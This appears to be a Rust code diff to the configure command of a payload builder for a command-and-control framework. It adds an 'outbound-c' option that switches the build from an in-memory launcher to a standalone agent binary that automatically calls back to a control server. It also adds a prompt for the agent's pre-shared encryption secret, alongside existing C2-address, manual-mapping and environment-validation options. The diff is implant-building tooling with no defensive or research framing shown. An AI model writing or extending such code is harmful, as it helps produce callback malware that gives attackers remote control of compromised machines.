@@ -162,6 +162,7 @@ fn cmd_configure(name: Option<String>) -> Result<()> {
         "manual-map",
         "traffic-normalization",
         "env-validation",
+        "outbound-c",
     ];
     let selected = MultiSelect::with_theme(&theme)
         .with_prompt("Cargo features (space to toggle, enter to confirm)")
@@ -171,6 +172,29 @@ fn cmd_configure(name: Option<String>) -> Result<()> {
         .into_iter()
         .map(|i| feature_choices[i].to_string())
         .collect();
+
+    // When outbound-c is requested the payload is an `agent-standalone` binary
+    // that dials back automatically, not the in-memory launcher.
+    let outbound = features.iter().any(|f| f == "outbound-c");
+    let (package, bin_name) = if outbound {
+        ("agent".to_string(), Some("agent-standalone".to_string()))
+    } else {
+        ("launcher".to_string(), None)
+    };
+
+    // Optional PSK for the agent→server AES-TCP channel (outbound-c only).
+    let c_server_secret: Option<String> = if outbound {
+        let s: String = Input::with_theme(&theme)
+            .with_prompt(
+                "Control Center pre-shared secret (must match `agent_shared_secret` in \
+                 orchestra-server.toml; blank = read ORCHESTRA_SECRET at runtime)",
+            )
+            .allow_empty(true)
+            .interact_text()?;
+        if s.trim().is_empty() { None } else { Some(s) }
+    } else {
+        None
+    };
 
     let output_name: String = Input::with_theme(&theme)
         .with_prompt("Output binary name (blank = same as profile)")
@@ -182,13 +206,15 @@ fn cmd_configure(name: Option<String>) -> Result<()> {
         target_arch: arch_choices[arch_idx].into(),
         c2_address,
         encryption_key,
+        c_server_secret,
         features,
         output_name: if output_name.trim().is_empty() {
             None
         } else {
             Some(output_name)
         },
-        package: "launcher".into(),
+        package,
+        bin_name,
     };
 
     // Validate before writing.
